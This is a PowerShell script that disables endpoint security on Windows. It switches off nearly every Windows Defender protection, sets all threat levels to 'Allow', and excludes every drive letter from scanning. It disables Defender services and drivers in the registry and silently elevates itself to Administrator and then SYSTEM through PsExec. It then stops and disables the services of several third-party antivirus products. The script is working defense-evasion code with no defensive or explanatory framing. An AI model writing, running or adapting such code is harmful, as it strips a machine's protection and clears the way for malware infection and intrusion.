$logFile = ".\log.txt"

# Clear log file
Clear-Content $logFile

function LogWrite
{
   Param ([string]$logstring)

   Add-content $logFile -value "$(Get-Date) - $logstring"
}

LogWrite "Starting script execution"

Set-MpPreference -DisableRealtimeMonitoring $true | Out-Null
LogWrite "Disabled realtime monitoring"
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force | Out-Null
LogWrite "Disabled AntiSpyware"

# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Stop and disable Windows Defender services
Stop-Service -Name WinDefend
Set-Service -Name WinDefend -StartupType Disabled

if(-Not $($(whoami) -eq "nt authority\system")) {
    $IsSystem = $false

    if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        LogWrite "    [i] Elevate to Administrator"
        $CommandLine = "-ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
        Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
        Exit
    }

    $psexec_path = $(Get-Command PsExec -ErrorAction 'ignore').Source 
    if($psexec_path) {
        LogWrite "    [i] Elevate to SYSTEM"
        $CommandLine = " -i -s powershell.exe -ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments 
        Start-Process -WindowStyle Hidden -FilePath $psexec_path -ArgumentList $CommandLine
        exit
    } else {
        LogWrite "    [i] PsExec not found, will continue as Administrator"
    }

} else {
    $IsSystem = $true
}

67..90|foreach-object{
    $drive = [char]$_
    Add-MpPreference -ExclusionPath "$($drive):\" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "$($drive):\*" -ErrorAction SilentlyContinue
}

Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue | Out-Null
LogWrite "Disabled archive scanning"
Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue | Out-Null
LogWrite "Disabled behavior monitoring"
Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue | Out-Null
LogWrite "Disabled intrusion prevention system"
Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue | Out-Null
LogWrite "Disabled IOAV protection"
Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue | Out-Null
LogWrite "Disabled removable drive scanning"
Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue | Out-Null
LogWrite "Disabled block at first seen"
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue | Out-Null
LogWrite "Disabled scanning mapped network drives for full scan"
Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue | Out-Null
LogWrite "Disabled scanning network files"
Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue | Out-Null
LogWrite "Disabled script scanning"
Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue | Out-Null
LogWrite "Disabled realtime monitoring"
Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue | Out-Null
LogWrite "Set low threat default action to Allow"
Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue | Out-Null
LogWrite "Set moderate threat default action to Allow"
Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue | Out-Null
LogWrite "Set high threat default action to Allow"

$svc_list = @("WdNisSvc", "WinDefend", "Sense")
foreach($svc in $svc_list) {
    if($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc")) {
        if( $(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc").Start -eq 4) {
            LogWrite "        [i] Service $svc already disabled"
        } else {
            LogWrite "        [i] Disable service $svc (next reboot)"
            Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" -Name Start -Value 4
            $need_reboot = $true
        }
    } else {
        LogWrite "        [i] Service $svc already deleted"
    }
}

$drv_list = @("WdnisDrv", "wdfilter", "wdboot")
foreach($drv in $drv_list) {
    if($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv")) {
        if( $(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv").Start -eq 4) {
            LogWrite "        [i] Driver $drv already disabled"
        } else {
            LogWrite "        [i] Disable driver $drv (next reboot)"
            Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv" -Name Start -Value 4
            $need_reboot = $true
        }
    } else {
        LogWrite "        [i] Driver $drv already deleted"
    }
}

if($(GET-Service -Name WinDefend).Status -eq "Running") {   
    LogWrite "    [+] WinDefend Service still running (reboot required)"
    $need_reboot = $true
} else {
    LogWrite "    [+] WinDefend Service not running"
}

LogWrite "Script execution completed"
# List of common antivirus services to stop and disable
$antivirusServices = @(
    "MsMpSvc",              # Windows Defender
    "WinDefend",            # Windows Defender
    "McAfeeEngineService",  # McAfee
    "Sophos",
    "avgsvc",
    "avast! Antivirus",
    "AVP",                  # Kaspersky
    "Norton",
    "BullGuard",
    "Bitdefender"
)

# Stop and disable each antivirus service
foreach ($service in $antivirusServices) {
    Stop-Service -Name $service -Force
    Set-Service -Name $service -StartupType Disabled
}